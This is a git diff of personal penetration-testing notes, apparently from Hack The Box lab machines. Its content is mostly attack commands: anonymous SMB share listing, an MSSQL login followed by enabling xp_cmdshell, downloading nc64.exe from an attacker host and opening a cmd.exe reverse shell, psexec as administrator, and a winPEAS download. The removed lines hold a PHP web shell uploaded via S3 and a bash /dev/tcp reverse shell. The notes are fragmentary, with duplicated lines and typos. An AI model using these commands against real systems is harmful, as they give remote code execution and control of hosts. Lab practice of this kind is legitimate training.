@@ -2,6 +2,12 @@ SMB -> Server Message Block 445
 
 smbclient -L
 
+smbclient -N -L \\\\{TARGET_IP}\\backups
+-N : No password
+-L : This option allows you to look at what services are available on a server
+
+smbclient -N \\\\{TARGET_IP}\\backups
+
 nmap -p- -sV // Scan all 65536 Ports
 
 redis-cli -h {host}
@@ -32,8 +38,6 @@ each name) on a single server. This allows one server to share its resources, su
 cycles, without requiring all the services to be used by the same hostname.
 The web server checks the domain name provided in the Host header field of the HTTP request and sends
 a response according to that
-
-echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
 
 dir : Uses directory/file enumeration mode.
 --url : The target URL.
@@ -116,47 +120,62 @@ on Linux by default, we'll use a tool called Evil-WinRM which is made for this k
 
 evil-winrm -i 10.129.136.91 -u administrator -p badminton
 
+impacket
 
-gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u
-http://thetoppers.htb
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+pip3 install .
 
-vhost : Uses VHOST for brute-forcing
--w : Path to the wordlist
--u : Specify the URL
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+pip3 install .
 
-If using Gobuster version 3.2.0 and above we also have to add the --append-domain flag to our
-command so that the enumeration takes into account the known vHost ( thetoppers.htb ) and appends it
-to the words found in the wordlist ( word.thetoppers.htb )
+cd impacket/examples
 
-Find directory 
-find / -type d -name 'httpdocs'
+python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.242.47 -windows-auth
 
-GoBuster will send out requests with a host header that looks like the following for each word in the
-wordlist:
-It will note the default response, and show any that return something different.
-echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
-gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u
-http://thetoppers.htb
-vhost : Uses VHOST for brute-forcing
--w : Path to the wordlist
--u : Specify the URL
-Host: [word].thetoppers.htb
+Check if system admin first
+SELECT is_srvrolemember('sysadmin')
+
+If 1 is true
+
+Command Execution through xp_cmdshell
+
+EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
+first as it’s disabled by default:
+EXEC sp_configure 'show advanced options', 1; — priv
+RECONFIGURE; — priv
+EXEC sp_configure 'xp_cmdshell', 1; — priv
+RECONFIGURE; — priv
+
+Check if xp_cmdshell is already activated
+SELECT is_srvrolemember('sysadmin')
+
+Now we are able to execute system commands:
+
+xp_cmdshell "whoami"
+
+xp_cmdshell "powershell -c pwd"
+
+Change to a directory where it will be possible to write
+
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
+http://10.10.14.9/nc64.exe -outfile nc64.exe"
+
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
+10.10.14.9 443"
+
+type (display text)
+
+From the output we can observer that we have SeImpersonatePrivilege (more information can be found
+here), which is also vulnerable to juicy potato exploit. However, we can first check the two existing files
+where credentials could be possible to be found.
+
+python3 psexec.py administrator@10.129.242.47
 
 
-aws configure (everything put temp)
+download winpeas
+owershell
+wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe
 
-aws --endpoint=http://s3.thetoppers.htb s3 ls
-
-aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
-
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
-
-aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
-upload: ./shell.php to s3://thetoppers.htb/shell.php  
-
-Reverse shell
-
-#!/bin/bash
-bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
-
-nc -nvlp 1337
+privilege escalation
